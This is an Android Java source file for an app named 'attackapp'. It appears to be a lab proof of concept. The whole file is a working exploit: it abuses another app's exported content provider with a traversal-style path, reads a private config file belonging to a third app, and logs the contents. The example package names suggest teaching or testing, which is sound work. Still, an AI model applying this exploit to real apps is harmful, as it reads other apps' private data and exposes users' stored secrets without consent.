package com.example.project.attackapp;

import androidx.appcompat.app.AppCompatActivity;

import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.FileNotFoundException;
import java.io.InputStream;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
//            InputStream is = getContentResolver().openInputStream(
//                    Uri.parse("content://com.example.project.victimapp1.MyContentProvider/" +
//                            "data/data/com.example.project.victimapp1/files/config.txt"));
            InputStream is = getContentResolver().openInputStream(
                    Uri.parse("content://com.example.project.victimapp1.MyContentProvider/" +
                            "data/data/com.example.project.victimapp2/files/config.txt"));
            String data = convertStreamToString(is);
            Log.i("Testttttttt", data);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    static String convertStreamToString(InputStream is) {
        Scanner s = new Scanner(is).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }
}